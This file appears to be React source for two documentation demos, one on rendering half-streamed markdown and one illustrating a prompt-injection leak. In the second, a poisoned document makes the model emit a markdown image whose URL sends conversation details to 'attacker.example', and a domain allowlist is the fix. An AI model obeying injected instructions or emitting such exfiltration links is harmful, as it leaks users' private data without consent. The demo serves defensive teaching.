"use client";

import { Globe, Link2, ShieldCheck } from "lucide-react";
import { AnimatePresence, motion } from "motion/react";
import { Fragment, type ReactNode } from "react";
import { cn } from "@/lib/cn";
import { Badge, Scene, type SceneState, useBeats, useCount } from "./scene";

const streamed =
  "Contractors are **not eligible** for paid parental leave [1]. Fixed-term employees qualify **after 6 months** of service [2].";

const streamTime = 6400;

export function PartialMarkdownDemo() {
  return (
    <Scene
      title="Half-written markdown"
      steps={[
        {
          label: "Stream",
          duration: streamTime + 2400,
          caption:
            "Left: the text is rendered exactly as received, so ** and [1 show as raw characters and then jump. Right: open bold gets a temporary closer, and a half-written citation is held back until its ] arrives.",
        },
      ]}
    >
      {(scene) => <PartialStage {...scene} />}
    </Scene>
  );
}

// Renders **bold** and [n] chips, leaving anything unfinished as literal text
function inline(text: string): ReactNode[] {
  return text.split(/(\*\*[^*]+\*\*|\[\d+\])/).map((part, index) => {
    const key = `${index}-${part}`;
    if (/^\*\*[^*]+\*\*$/.test(part)) return <strong key={key}>{part.slice(2, -2)}</strong>;
    const citation = part.match(/^\[(\d+)\]$/);
    if (citation)
      return (
        <motion.sup
          key={key}
          initial={{ scale: 0.4, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="mx-0.5 inline-block rounded bg-fd-primary/15 px-1 text-[10px] font-medium text-fd-primary"
        >
          {citation[1]}
        </motion.sup>
      );
    return <Fragment key={key}>{part}</Fragment>;
  });
}

// The fixes from the page: hold back what cannot be rendered yet, and close what is open
function prepare(text: string) {
  let shown = text;
  let held = shown.match(/(\[\d*|\*\*?)$/)?.[0] ?? "";
  // A trailing ** that closes bold is complete, so it is not held back
  if (held === "**" && (shown.slice(0, -2).match(/\*\*/g)?.length ?? 0) % 2 === 1) held = "";
  shown = shown.slice(0, shown.length - held.length);
  const closer = (shown.match(/\*\*/g)?.length ?? 0) % 2 === 1 ? "**" : "";
  return { shown: shown + closer, held, closer };
}

function PartialStage({ run }: SceneState) {
  const count = useCount(run, streamed.length, streamTime, 300);
  const text = streamed.slice(0, count);
  const fixed = prepare(text);
  const done = count === streamed.length;

  return (
    <div className="space-y-3">
      <div className="grid gap-4 sm:grid-cols-2">
        <Panel title="Rendered as received" tone="bad">
          {inline(text)}
          {!done && <Caret />}
        </Panel>
        <Panel title="With temporary fixes" tone="good">
          {inline(fixed.shown)}
          {!done && <Caret />}
        </Panel>
      </div>
      <div className="flex flex-wrap gap-x-6 gap-y-1 rounded-lg bg-fd-muted/50 px-3 py-2 font-mono text-xs text-fd-muted-foreground">
        <span>
          Temporary closer: <span className="text-fd-foreground">{fixed.closer ? '"**"' : "none"}</span>
        </span>
        <span>
          Held back: <span className="text-fd-foreground">{fixed.held ? `"${fixed.held}"` : "nothing"}</span>
        </span>
        <span>Stored text is never changed</span>
      </div>
    </div>
  );
}

function Panel({ title, tone, children }: { title: string; tone: "good" | "bad"; children: ReactNode }) {
  return (
    <div>
      <p className={cn("mb-2 text-xs font-medium uppercase tracking-wide", tone === "good" ? "text-fd-success" : "text-fd-error")}>
        {title}
      </p>
      <p className="h-32 rounded-lg border bg-fd-background p-3 text-sm leading-6">{children}</p>
    </div>
  );
}

function Caret() {
  return <span className="ml-0.5 inline-block h-4 w-1.5 animate-pulse bg-fd-foreground align-text-bottom" />;
}

const leakBeats = [600, 1600, 2300] as const;
const leakUrl = "https://attacker.example/collect?d=Q3+layoffs+plan+for+Sales";

export function MarkdownExfiltrationDemo() {
  return (
    <Scene
      title="An image that leaks the conversation"
      steps={[
        {
          label: "Images from any domain",
          duration: 4800,
          caption:
            "The poisoned document told the model to add an image. The browser fetches it as soon as the answer renders, and the URL carries the conversation to the attacker. Nobody clicked anything.",
        },
        {
          label: "Own domain only",
          duration: 4800,
          caption: "The image host is not on the allowlist, so the renderer shows a plain link instead. The browser makes no request.",
        },
      ]}
    >
      {(scene) => <LeakStage {...scene} />}
    </Scene>
  );
}

function LeakStage({ step, run }: SceneState) {
  const safe = step === 1;
  const beat = useBeats(run, leakBeats);

  return (
    <div className="grid gap-4 sm:grid-cols-[1.3fr_1fr]">
      <div className="h-48 min-w-0 rounded-lg border bg-fd-background p-3 text-sm">
        <p className="mb-2 text-xs font-medium text-fd-muted-foreground">Assistant answer</p>
        {beat >= 1 && (
          <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            Here is a summary of the planning document you shared.
          </motion.p>
        )}
        {beat >= 2 && (
          <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="mt-3">
            <p className="mb-1.5 break-all rounded bg-fd-muted px-2 py-1 font-mono text-[11px] text-fd-muted-foreground">
              <span className="font-sans">Model wrote: </span>![status]({leakUrl})
            </p>
            {safe ? (
              <span className="inline-flex items-center gap-1.5 text-fd-primary underline">
                <Link2 className="size-3.5" />
                status
                <span className="text-xs text-fd-muted-foreground no-underline">(attacker.example)</span>
              </span>
            ) : (
              <span className="text-xs italic text-fd-muted-foreground">Rendered as an image the user never notices</span>
            )}
          </motion.div>
        )}
      </div>
      <div className="flex h-48 min-w-0 flex-col rounded-lg border bg-fd-background p-3 text-xs">
        <p className="mb-2 flex items-center gap-1.5 font-medium text-fd-muted-foreground">
          <Globe className="size-3.5" />
          Browser network requests
        </p>
        <div className="flex-1 space-y-1.5 font-mono">
          <p className="truncate text-fd-muted-foreground">GET /api/chats/41/stream 200</p>
          <AnimatePresence>
            {beat >= 3 && !safe && (
              <motion.p
                initial={{ opacity: 0, x: -10, backgroundColor: "rgba(239,68,68,0.35)" }}
                animate={{ opacity: 1, x: 0, backgroundColor: "rgba(239,68,68,0.12)" }}
                className="break-all rounded px-1.5 py-1 text-fd-error"
              >
                GET {leakUrl}
              </motion.p>
            )}
          </AnimatePresence>
        </div>
        <div className="min-h-6">
          {beat >= 3 &&
            (safe ? (
              <Badge tone="good">
                <ShieldCheck className="size-3.5" />
                No request to other domains
              </Badge>
            ) : (
              <Badge tone="bad">Data sent, no click needed</Badge>
            ))}
        </div>
      </div>
    </div>
  );
}
